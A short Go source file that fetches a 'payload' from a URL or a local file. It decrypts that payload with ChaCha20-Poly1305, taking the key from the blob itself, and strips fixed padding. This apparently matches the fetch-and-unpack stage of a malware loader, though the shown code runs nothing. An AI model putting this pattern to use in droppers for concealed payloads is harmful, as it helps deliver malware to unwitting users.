package main

import (
	"encoding/binary"
	"golang.org/x/crypto/chacha20poly1305"
	"io"
	"net/http"
	"os"
	"time"
)

func decryptChaCha(data []byte) ([]byte, error) {
	if len(data) < 50 {
		return data, nil
	}
	keySize := chacha20poly1305.KeySize
	nonceSize := chacha20poly1305.NonceSize

	key := data[len(data)-keySize:]
	nonce := data[:nonceSize]
	ciphertext := data[nonceSize : len(data)-keySize]

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return data, nil
	}

	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return data, nil
	}

	if len(plaintext) > 512+4 {
		realSize := binary.BigEndian.Uint32(plaintext[512 : 512+4])
		return plaintext[516 : 516+realSize], nil
	}
	return plaintext, nil
}

func fetchPayload(path string) ([]byte, error) {
	if len(path) > 4 && path[:4] == "http" {
		cl := &http.Client{Timeout: 10 * time.Second}
		resp, err := cl.Get(path)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		return io.ReadAll(resp.Body)
	}
	return os.ReadFile(path)
}
